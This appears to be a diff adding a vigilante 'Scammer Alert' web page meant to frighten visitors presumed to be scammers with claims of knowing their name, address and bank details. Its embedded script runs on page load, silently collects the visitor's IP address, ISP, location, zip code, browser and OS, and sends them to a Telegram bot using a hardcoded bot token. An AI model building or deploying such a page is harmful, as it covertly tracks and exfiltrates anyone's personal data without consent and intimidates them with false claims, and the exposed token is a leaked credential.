@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scammer Alert!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8d7da;
+            color: #721c24;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 36px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 20px;
+            margin-bottom: 15px;
+        }
+        .warning {
+            font-weight: bold;
+            color: #c82333;
+        }
+        .emoji {
+            font-size: 48px;
+        }
+    </style>
+    <title>Scam Exposer India</title>
+    <script src="https://cdn.jsdelivr.net/npm/visitor-api@1.0.0/dist/visitor-api.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@0.7.29/dist/ua-parser.min.js"></script>
+  </head>
+  <body>
+      <h1>🚨 WARNING: SCAMMER ALERT! 🚨</h1>
+    <h2>You’ve Made a Grave Mistake!</h2>
+
+    <p class="warning">Welcome to Your Worst Nightmare.</p>
+    <p>You’ve landed on a site that tracks and gathers information about scammers just like you. We have <strong>ALL</strong> your details!</p>
+
+    <h2>Here’s What We Know:</h2>
+    <p><strong>Name</strong></p>
+    <p><strong>Exact Address</strong></p>
+    <p><strong>Bank Information</strong></p>
+    <p><strong>Phone Number</strong></p>
+    <p><strong>Email Address</strong></p>
+
+    <p class="emoji">😢</p>
+    <h2>Time to Face the Reality</h2>
+    <p>Your actions have been documented, and we’re not alone. Law enforcement is now aware of your activities.</p>
+
+    <h2>What Happens Next?</h2>
+    <ul style="list-style-type: none;">
+        <li>✅ Your Information is Compromised.</li>
+        <li>✅ You Are Under Surveillance.</li>
+        <li>✅ Legal Action is Possible.</li>
+    </ul>
+
+    <h2>🛑 It’s Too Late! 🛑</h2>
+    <p><strong>We have informed the police and people online.</strong></p>
+    <p><strong>Reflect on your choices.</strong></p>
+    <p><strong>The clock is ticking.</strong></p>
+
+    <script>
+      // Get IP address using ipify API
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ipAddress = data.ip;
+
+          // Get device information using VisitorAPI
+          const visitorAPI = new VisitorAPI('7T5znrCevQpvnaVzvDxP', (data) => {
+            const deviceInfo = data;
+            const isp = deviceInfo.isp;
+            const city = deviceInfo.city;
+            const region = deviceInfo.region;
+            const time = deviceInfo.time;
+            const geolocationInfo = deviceInfo.geolocation;
+            const browserInfo = deviceInfo.browser;
+            const state = deviceInfo.state;
+            const zip = deviceInfo.zip;
+
+            // Get OS information using UAParser
+            const userAgent = navigator.userAgent;
+            const parser = new UAParser();
+            const osInfo = parser.parse(userAgent).os;
+
+            // Construct the message
+            const message = `Scammer Information:\nIP Address: ${ipAddress}\nISP: ${isp}\nDevice Info: ${deviceInfo}\nOS Info: ${osInfo}\nCity: ${city}\nRegion: ${region}\nState: ${state}\nZip: ${zip}\nTime: ${time}\nGeolocation Info: ${geolocationInfo}\nBrowser Info: ${browserInfo}`;
+
+            // Create a blob for the file
+            const fileContent = message;
+            const blob = new Blob([fileContent], { type: 'text/plain' });
+
+            // Send the file to Telegram bot
+            const telegramBotToken = '7454502111:AAHkIP1RbjD42g8gf3_y5bdDhMEaV6R4RbY';
+            const telegramBotChatId = '6329796205';
+            const formData = new FormData();
+            formData.append('chat_id', telegramBotChatId);
+            formData.append('document', blob, 'scammer_info.txt');
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument`, {
+              method: 'POST',
+              body: formData
+            })
+              .then(response => response.json())
+              .then(data => console.log(data))
+              .catch(error => console.error(error));
+          }, (error) => console.error(error));
+        })
+        .catch(error => console.error(error));
+    </script>
+  </body>
+</html
